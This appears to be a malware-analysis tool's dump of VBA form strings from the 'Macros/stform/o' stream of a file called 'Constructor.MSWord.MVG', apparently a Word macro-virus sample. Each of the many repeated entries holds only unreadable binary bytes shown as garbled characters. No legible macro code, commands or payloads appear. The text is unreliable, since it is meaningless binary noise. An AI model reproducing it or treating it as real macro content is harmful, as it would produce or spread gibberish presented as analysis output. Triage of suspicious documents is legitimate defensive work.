VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������)���$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kĝpޱ��rf�ģ��h�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6����^��"��:��O��Im;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4�q���ƻkɪp�R�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�����#n��τ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n���7�g����z��C������k�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e(�)���- ���n���ϱ�o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J�r�����|o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ہ�x�h�Z��Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��癣���s)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�[�Bmi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Skk�tF�'%2Vo�Ŷ'�^�ךּ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
߻�֯y��s�����U5��ŷ"K||'\!�_Һ�3�\��V|6�~�M幧
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*ͬ�峻;��O'��ɫ���e:�9%74�U%����t��4%�(�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>DR�91d���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N~g#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�_*�{�Ȝ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>���K�Y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DM���!���ݭP�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z�cK"��RQߣ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ٿ}��7��V76�iM"v��n-��SW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�pj�,t��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����+jVԞ�L��V���s+ri�bi�����_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3�o���i�X�����V�Q�����uL�'3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�#���������x�x���ϏʦN�
�:\*��T�/��u����f�k5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_��Ǻt�Ƒ���o#���s����X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_���<سk���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�$�c�Eדvw,�:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.����K>-w����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m��i�Df�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZF3i/r���V+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sb�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/��d�C�'��+��O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��yn��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y���ģ3���\���ݕT,��J.KX����d�`��t���8u��V-�����fdq��T��.ua]�]��=2T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����d^�>R��9�lZZۯ�kޞ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����n�-_����[eД%�c$����=6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}��]y�m�ݱvWmw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�/�M2F-?{�n|}K�LDlӽfGevO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���2�Ŋ�^%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����P�ݑ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	x�Lu�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�K��mf�Z>5�f������\u�WcJ�\U�V�\�5_ݿ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|Ҝ�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���;�0�"~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����HB�׽�9��6�kT�N��o8ﺳ�Q[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L��7�us��\T�M����m���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����{ZW�X�{V���F�j[R�Jpzun>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*�X��T��"f}��?0��b�T(�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�*����ݲ䷗c��;�Mq�;�ˏk҆,��Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�?�q�zw}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���E��-k|d<�cw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[���*���r�����g{��^�lc/�2�Ӣ<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^����i^�cù�^fH���]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nD���}���Of�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�|�C�T���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�����)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�߄�����WV�T��X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2{��ߴ���啍�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���F����9�K}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rq�j��Xr�s�FM2��9YcӪs�[z�M);k�%�8��{�<'5�p��<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��2^��?z2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F
��މI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
us����c�7*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$��5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��cq�R�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�paݤ��J���ޭ����k�&�vGb�-�_������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k������#���u�15�Mc���8�`�Kn��ڣX��ʳ1e��MGb�On�>�I{N]��owM��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Lhö�[l��ڛm�l���3>�IX�4LǼ9����i:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�Z����8'�������}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~��|�'C�ٳ�x��dw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�eq|�/#���ö
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�n��5%����F|5�I��7��:Zk:Ǹ�;��ss�ݙ^4v�X��VH���-�ĝi���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*��N�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R1أ�ۦ�����K{rm6����H��-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W���x���,�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
쏨����(�$��F_�S���Y2�,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Iq[evǡ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���q�:2�z�K�K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{Q���S=&��ճly-I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�U�~�hN)�M5{�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�ō)6���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q䈶M���kW,@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#���5̻�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ĞW�C}�4����W��+�"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܜx��;w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FN2MI=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�$\X׺=}��OM�	z7ۿN�]��՘YU�2�m)��������l����K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���~4�.��5�]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:Z4�kh�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dm�_�y�:�K��ev
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mv�^䞚��8KN�⫑�|L7�^�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ON5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�XKl�����1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>����SG��W�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{K��vtC�#�R��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SPiKIW)/.���s��"g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ziϗ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��7{g��'+鏯���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+����ɦ�ݽ|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V����}q�O/b�8F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ȥ����ݵ}��3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���;x��]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�rZ���~SZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$�^�3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-��NnQS�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���L�n���DL�;�5�N���gO�O~>*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,wQ%c�а�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��'���9Q�ʗ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ƛj��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o2�rF����������8�Y��o̞����x��;.�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bӻzoXI)���G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/,��N>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W%�w�j\�r㮻��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K���Գ�V�k��|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�/i�:�4�ߤ��ꑀ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
